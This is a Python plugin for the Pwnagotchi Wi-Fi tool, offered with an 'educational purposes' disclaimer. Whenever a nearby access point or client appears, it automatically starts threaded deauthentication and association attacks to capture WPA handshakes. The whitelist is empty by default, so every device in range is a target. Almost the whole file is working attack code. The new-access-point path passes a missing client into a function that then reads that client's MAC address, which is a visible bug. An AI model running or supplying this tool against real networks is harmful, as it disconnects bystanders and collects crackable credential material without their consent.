"""
DISCLAIMER: This software is provided for educational and research purposes only.
Use of this plugin on networks or devices that you do not own or have explicit permission
to test is strictly prohibited. The author(s) and contributors are not responsible for any 
misuse, damages, or legal consequences that may result from unauthorized or improper usage.
By using this plugin, you agree to assume all risks and take full responsibility for ensuring
that all applicable laws and regulations are followed.
"""

import logging
import time
import threading
import pwnagotchi.plugins as plugins

class probenpwn(plugins.Plugin):
    __author__ = 'AlienMajik'
    __version__ = '1.0.0'
    __license__ = 'GPL3'
    __description__ = 'Pwn more aggressively. Launch immediate associate or deauth attack when bettercap spots a device, with enhanced performance for more handshakes.'

    def __init__(self):
        logging.debug("ProbeNpwn plugin created")
        self._agent = None
        self.old_name = None
        self.recents = {}
        self.whitelist = set()
        self.attack_threads = []
        self.epoch_duration = 60  # Define a default epoch duration (seconds)

    # called before the plugin is unloaded
    def on_unload(self, ui):
        if self.old_name:
            ui.set('name', "%s " % self.old_name)
        else:
            ui.set('name', "%s>  " % ui.get('name')[:-3])
        self.old_name = None
        logging.info("probing out.")

    # called to setup the UI elements
    def on_ui_setup(self, ui):
        self._ui = ui

    def on_ui_update(self, ui):
        if self.old_name is None:
            self.old_name = ui.get('name')
            if self.old_name:
                i = self.old_name.find('>')
                if i:
                    ui.set('name', "%s%s" % (self.old_name[:i], "!!!"))

    # called when everything is ready and the main loop is about to start
    def on_ready(self, agent):
        self._agent = agent
        logging.info("Probed and Pwnd!")
        agent.run("wifi.clear")
        if self._ui:
            self._ui.set("status", "Probing!\nPWNING THEM GUTS!")

    def track_recent(self, ap, cl=None):
        ap['_track_time'] = time.time()
        self.recents[ap['mac'].lower()] = ap
        if cl:
            cl['_track_time'] = ap['_track_time']
            self.recents[cl['mac'].lower()] = cl

    def ok_to_attack(self, ap):
        if not self._agent:
            return False
        if ap['hostname'].lower() in self.whitelist or ap['mac'].lower() in self.whitelist:
            return False
        return True

    def attack_target(self, agent, ap, cl):
        if not self.ok_to_attack(ap):
            return
        logging.debug(f"Launching attack on AP {ap['mac']} and client {cl['mac']}")
        # Perform deauth attack
        agent.deauth(ap, cl, self.dynamic_attack_delay(ap, cl))
        # Perform associate attack
        agent.associate(ap, 0.2)

    def dynamic_attack_delay(self, ap, cl):
        # Adjust attack delay based on client signal strength or network type
        if cl.get('signal', -100) < -60:
            return 0.5  # Longer delay for weak signals
        else:
            return 0.25  # Faster attack for stronger signals

    def on_bcap_wifi_ap_new(self, agent, event):
        try:
            ap = event['data']
            if agent._config['personality']['associate'] and self.ok_to_attack(ap):
                logging.debug("insta-associate: %s (%s)" % (ap['hostname'], ap['mac']))
                # Start a thread to handle the attack
                attack_thread = threading.Thread(target=self.attack_target, args=(agent, ap, None))
                attack_thread.start()
                self.attack_threads.append(attack_thread)
        except Exception as e:
            logging.error(f"Error in on_bcap_wifi_ap_new: {repr(e)}")

    def on_bcap_wifi_client_new(self, agent, event):
        try:
            ap = event['data']['AP']
            cl = event['data']['Client']
            if agent._config['personality']['deauth'] and self.ok_to_attack(ap) and self.ok_to_attack(cl):
                logging.debug("insta-deauth: %s (%s)->'%s'(%s)(%s)" % (ap['hostname'], ap['mac'],
                                                                      cl['hostname'], cl['mac'], cl['vendor']))
                # Start a thread for each deauth attack
                attack_thread = threading.Thread(target=self.attack_target, args=(agent, ap, cl))
                attack_thread.start()
                self.attack_threads.append(attack_thread)
        except Exception as e:
            logging.error(f"Error in on_bcap_wifi_client_new: {repr(e)}")

    def on_handshake(self, agent, filename, ap, cl):
        logging.info(f"Handshake detected from {ap['mac']}")
        if 'mac' in ap and 'mac' in cl:
            amac = ap['mac'].lower()
            cmac = cl['mac'].lower()
            if amac in self.recents:
                logging.info(f"Captured handshake from {ap['hostname']} ({ap['mac']}) -> '{cl['hostname']}' ({cl['mac']}) ({cl['vendor']})")
                del self.recents[amac]
                if cmac in self.recents:
                    del self.recents[cmac]

    def on_epoch(self, agent, epoch, epoch_data):
        for mac in list(self.recents):
            if self.recents[mac]['_track_time'] < (time.time() - (self.epoch_duration * 2)):
                del self.recents[mac]

    def on_bcap_wifi_ap_updated(self, agent, event):
        try:
            ap = event['data']
            if self.ok_to_attack(ap):
                logging.debug(f"AP updated: {ap['hostname']} ({ap['mac']})")
                self.track_recent(ap)
        except Exception as e:
            logging.error(f"Error in on_bcap_wifi_ap_updated: {repr(e)}")

    def on_bcap_wifi_client_updated(self, agent, event):
        try:
            ap = event['data']['AP']
            cl = event['data']['Client']
            if self.ok_to_attack(ap) and self.ok_to_attack(cl):
                logging.debug(f"Client updated: {ap['hostname']} ({ap['mac']}) -> '{cl['hostname']}' ({cl['mac']}) ({cl['vendor']})")
                self.track_recent(ap, cl)
        except Exception as e:
            logging.error(f"Error in on_bcap_wifi_client_updated: {repr(e)}")
